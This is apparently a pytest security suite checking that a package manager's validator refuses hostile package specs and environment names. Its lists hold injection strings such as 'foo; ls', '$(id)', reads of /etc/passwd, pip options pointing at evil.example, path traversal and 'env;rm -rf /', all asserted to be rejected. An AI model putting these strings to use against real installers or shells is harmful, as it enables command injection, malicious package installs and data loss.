"""SPEC section 11.9: hostile input is refused before it can reach an installer.

Every string in :data:`INJECTION_ATTEMPTS` is something a person could type
into a package field, paste from a web page, or import from a file that was
emailed to them. None of them may reach a backend.
"""

from __future__ import annotations

import pytest

from pypackhub.core.validation import (
    MAX_ENVIRONMENT_NAME_LENGTH,
    Reason,
    ValidationError,
    validate_environment_name,
    validate_package_spec,
)

pytestmark = pytest.mark.security

INJECTION_ATTEMPTS = [
    "foo; ls",
    "foo && whoami",
    "foo || whoami",
    "$(id)",
    "`id`",
    "foo | tee /tmp/exfil",
    "foo\nbar",
    "foo\tbar",
    "foo > /tmp/out",
    "foo < /etc/passwd",
    "-r /etc/passwd",
    "--index-url=http://evil.example/simple",
    "--extra-index-url=http://evil.example/simple",
    "--trusted-host=evil.example",
    "-e .",
    "../../x",
    "../x",
    "../" * 20 + "etc/passwd",
    "/absolute/path",
    "foo bar",
    "requests; python_version < '3.9'",
    "pkg @ https://evil.example/pkg-1.0-py3-none-any.whl",
    "foo\\bar",
    "foo'bar",
    'foo"bar',
    "foo{bar}",
    "foo(bar)",
]

VALID_SPECS = [
    "requests",
    "Pillow",
    "ruamel.yaml",
    "zope.interface",
    "typing_extensions",
    "package-name",
    "requests==2.31.0",
    "requests>=2.31.0",
    "requests~=2.31",
    "requests!=2.30.0",
    "django>=4,<5",
    "requests[socks]>=2.31",
    "requests >= 2.31",
]

HOMOGLYPHS = [
    "r\u0435quests",  # Cyrillic small letter ie looks like "e"
    "num\u0440y",  # Cyrillic small letter er looks like "p"
    "requ\u0455ts",  # Cyrillic small letter dze looks like "s"
    "requests\u200b",  # zero width space
    "requests\ufe0f",  # variation selector
    "re\u202equests",  # right-to-left override
]


@pytest.mark.parametrize("spec", INJECTION_ATTEMPTS)
def test_injection_attempts_are_refused(spec: str) -> None:
    with pytest.raises(ValidationError):
        validate_package_spec(spec)


@pytest.mark.parametrize("spec", VALID_SPECS)
def test_ordinary_specs_are_accepted(spec: str) -> None:
    assert validate_package_spec(spec)


@pytest.mark.parametrize("spec", HOMOGLYPHS)
def test_homoglyph_names_are_refused(spec: str) -> None:
    with pytest.raises(ValidationError) as info:
        validate_package_spec(spec)

    assert info.value.reason in {Reason.NON_ASCII, Reason.VARIATION_SELECTOR}


def test_leading_dash_is_reported_as_option_injection() -> None:
    with pytest.raises(ValidationError) as info:
        validate_package_spec("--index-url=http://evil.example/simple")

    assert info.value.reason is Reason.OPTION_INJECTION


def test_shell_metacharacter_is_reported_as_such() -> None:
    with pytest.raises(ValidationError) as info:
        validate_package_spec("foo; ls")

    assert info.value.reason is Reason.SHELL_METACHARACTER


def test_whitespace_around_a_specifier_is_normalised() -> None:
    assert validate_package_spec("requests >= 2.31") == "requests>=2.31"


def test_direct_reference_needs_an_explicit_opt_in() -> None:
    reference = "demo @ https://example.org/demo-1.0-py3-none-any.whl"

    with pytest.raises(ValidationError) as info:
        validate_package_spec(reference)

    assert info.value.reason in {
        Reason.DIRECT_REFERENCE_NOT_ALLOWED,
        Reason.SHELL_METACHARACTER,
    }

    assert validate_package_spec(reference, allow_direct_reference=True).startswith("demo")


@pytest.mark.parametrize(
    "reference",
    [
        "demo @ http://example.org/demo-1.0-py3-none-any.whl",
        "demo @ https://user:password@example.org/demo-1.0-py3-none-any.whl",
        "demo @ file:///etc/passwd",
    ],
)
def test_dangerous_direct_references_are_refused_even_in_advanced_mode(reference: str) -> None:
    with pytest.raises(ValidationError):
        validate_package_spec(reference, allow_direct_reference=True)


def test_markers_are_only_accepted_for_imported_files() -> None:
    line = "requests; python_version >= '3.9'"

    with pytest.raises(ValidationError) as info:
        validate_package_spec(line)

    assert info.value.reason is Reason.SHELL_METACHARACTER

    assert validate_package_spec(line, allow_marker=True)


def test_empty_and_oversized_specs_are_refused() -> None:
    with pytest.raises(ValidationError) as empty:
        validate_package_spec("")

    assert empty.value.reason is Reason.EMPTY

    with pytest.raises(ValidationError) as oversized:
        validate_package_spec("x" * 5000)

    assert oversized.value.reason is Reason.TOO_LONG


@pytest.mark.parametrize("name", ["demo", "demo-env", "demo_env", "demo.env", "env3"])
def test_ordinary_environment_names_are_accepted(name: str) -> None:
    assert validate_environment_name(name) == name


@pytest.mark.parametrize(
    "name",
    ["../evil", "..", ".hidden-ok-actually-not", "-rf", "", "env name", "env;rm -rf /", "café"],
)
def test_bad_environment_names_are_refused(name: str) -> None:
    with pytest.raises(ValidationError):
        validate_environment_name(name)


def test_environment_name_length_is_capped() -> None:
    with pytest.raises(ValidationError) as info:
        validate_environment_name("x" * (MAX_ENVIRONMENT_NAME_LENGTH + 1))

    assert info.value.reason is Reason.TOO_LONG
